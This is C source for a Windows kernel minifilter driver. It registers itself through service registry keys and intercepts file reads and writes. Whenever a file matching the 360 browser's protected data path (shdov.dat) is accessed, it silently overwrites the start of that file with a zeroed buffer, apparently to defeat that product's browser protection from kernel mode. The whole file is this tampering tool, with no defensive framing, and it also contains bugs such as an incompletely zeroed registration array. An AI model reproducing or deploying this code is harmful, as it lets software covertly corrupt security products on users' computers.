#include"pch.h"

#pragma warning(disable: 4100)

PFLT_FILTER	g_hFilter = NULL;

//360Ŀ¼//360se6//application/x.x.x.x/shdov.dat
UNICODE_STRING	g_us360ProtectedFile;
UNICODE_STRING g_us360ProtectedExe;

WCHAR g_sz360Data[100] = { 0 };

VOID MinifilterSetProtectedFile(WCHAR* szFileName, WCHAR* szProcessName)
{
	RtlInitUnicodeString(&g_us360ProtectedFile, szFileName);
	RtlInitUnicodeString(&g_us360ProtectedExe, szProcessName);
}

BOOLEAN SpyFindSubString(PUNICODE_STRING String, PUNICODE_STRING SubString)
{
	ULONG Index;

	if (RtlEqualUnicodeString(String, SubString, TRUE))
		return TRUE;

	for (Index = 0; Index + (SubString->Length / sizeof(WCHAR)) <= (String->Length / sizeof(WCHAR)); Index++)
	{
		if (_wcsnicmp(&String->Buffer[Index], SubString->Buffer, (SubString->Length / sizeof(WCHAR))) == 0)
			return TRUE;
	}

	return FALSE;
}

FLT_PREOP_CALLBACK_STATUS MinifilterSetInformationPreCall(IN OUT PFLT_CALLBACK_DATA FilterCallbackData, IN PCFLT_RELATED_OBJECTS FilterRelatedObjects, OUT PVOID *CompletionContext OPTIONAL)
{
	PFLT_FILE_NAME_INFORMATION NameInfo;

	NTSTATUS status = FltGetFileNameInformation(FilterCallbackData, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &NameInfo);

	if (NT_SUCCESS(status) && FilterCallbackData->Iopb->MajorFunction == IRP_MJ_SET_INFORMATION)
	{
		status = FltParseFileNameInformation(NameInfo);
		if (NT_SUCCESS(status))
		{
			if (SpyFindSubString(&NameInfo->Name, &g_us360ProtectedFile) || SpyFindSubString(&NameInfo->Name, &g_us360ProtectedExe))
			{
				FltReleaseFileNameInformation(NameInfo);
				return FLT_PREOP_DISALLOW_FASTIO;
			}
		}
	}

	if (NT_SUCCESS(status))
		FltReleaseFileNameInformation(NameInfo);

	return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_PREOP_CALLBACK_STATUS MinifilterPreReadWrite
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext
)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);
	PAGED_CODE();
	{
		PFLT_FILE_NAME_INFORMATION NameInfo;
		LARGE_INTEGER offset;
		ULONG dwWrite = 0;

		NTSTATUS status = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &NameInfo);

		if (NT_SUCCESS(status))
		{
			status = FltParseFileNameInformation(NameInfo);
			if (NT_SUCCESS(status))
			{
				/*if(!_strnicmp("360se.exe", PsGetProcessImageFileName(PsGetCurrentProcess()), strlen("360se.exe")))
					DbgPrint("%wZ\n", &NameInfo->Name);*/
				if (SpyFindSubString(&NameInfo->Name, &g_us360ProtectedFile))
				{
					if (NameInfo->Size != 0)
					{
						offset.QuadPart = 0;
						FltWriteFile(FltObjects->Instance, FltObjects->FileObject, &offset, sizeof(g_sz360Data), g_sz360Data, FLTFL_IO_OPERATION_NON_CACHED |
							FLTFL_IO_OPERATION_DO_NOT_UPDATE_BYTE_OFFSET, &dwWrite, NULL, NULL);
					}
					FltReleaseFileNameInformation(NameInfo);
					return FLT_PREOP_DISALLOW_FASTIO;
				}
			}
		}

		if (NT_SUCCESS(status))
			FltReleaseFileNameInformation(NameInfo);
	}
	return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

NTSTATUS PrepMiniFilter(IN PUNICODE_STRING RegistryString, IN PWSTR Altitude)
{
	WCHAR Data[MAX_PATH] = { 0 };
	WCHAR TempStr[MAX_PATH] = { 0 };
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PWSTR wPtr = wcsrchr(RegistryString->Buffer, L'\\');

	if (!MmIsAddressValid(wPtr))
		return STATUS_INVALID_PARAMETER;

	RtlZeroMemory(TempStr, MAX_PATH * sizeof(WCHAR));

	swprintf(TempStr, L"%ws\\Instances", wPtr);

	status = RtlCreateRegistryKey(RTL_REGISTRY_SERVICES, TempStr);
	if (NT_SUCCESS(status))
	{
		swprintf(Data, L"%ws Instance", &wPtr[1]);
		
		status = RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, TempStr, L"DefaultInstance", REG_SZ, Data, (ULONG)(wcslen(Data) * sizeof(WCHAR) + 2));
		if (NT_SUCCESS(status))
		{
			RtlZeroMemory(TempStr, MAX_PATH * sizeof(WCHAR));
			swprintf(TempStr, L"%ws\\Instances%ws Instance", wPtr, wPtr);
			
			status = RtlCreateRegistryKey(RTL_REGISTRY_SERVICES, TempStr);
			if (NT_SUCCESS(status))
			{
				status = RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, TempStr, L"Altitude", REG_SZ, Altitude, (ULONG)(wcslen(Altitude) * sizeof(WCHAR) + 2));
				if (NT_SUCCESS(status))
				{
					ULONG dwData = 0;
					status = RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, TempStr, L"Flags", REG_DWORD, &dwData, 4);
				}
			}
		}
	}
	return status;
}

NTSTATUS FinalizeMiniFilterCallback(IN FLT_FILTER_UNLOAD_FLAGS Flags)
{
	FltUnregisterFilter(g_hFilter);
	Flags = FLTFL_FILTER_UNLOAD_MANDATORY;
	return STATUS_SUCCESS;
}

NTSTATUS InitializeMiniFilter(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS status = PrepMiniFilter(RegistryPath, L"321211");

	if (NT_SUCCESS(status))
	{
		FLT_REGISTRATION FltReg;
		FLT_OPERATION_REGISTRATION FltOpReg[3];
		RtlZeroMemory(&FltReg, sizeof(FltReg));
		FltReg.Size = sizeof(FLT_REGISTRATION);
		FltReg.Version = FLT_REGISTRATION_VERSION;
        FltReg.FilterUnloadCallback = NULL;
		FltReg.OperationRegistration = FltOpReg;
		RtlZeroMemory(FltOpReg, sizeof(FLT_OPERATION_REGISTRATION) * 2);

		FltOpReg[0].MajorFunction = IRP_MJ_WRITE;
		FltOpReg[0].Flags = FLTFL_OPERATION_REGISTRATION_SKIP_PAGING_IO;
		FltOpReg[0].PreOperation = MinifilterPreReadWrite;
		FltOpReg[1].MajorFunction = IRP_MJ_READ;
		FltOpReg[1].Flags = FLTFL_OPERATION_REGISTRATION_SKIP_PAGING_IO;
		FltOpReg[1].PreOperation = MinifilterPreReadWrite;
		FltOpReg[2].MajorFunction = IRP_MJ_OPERATION_END;

		status = FltRegisterFilter(DriverObject, &FltReg, &g_hFilter);
		if (NT_SUCCESS(status))
		{
			status = FltStartFiltering(g_hFilter);
		}
	}
	return status;
}

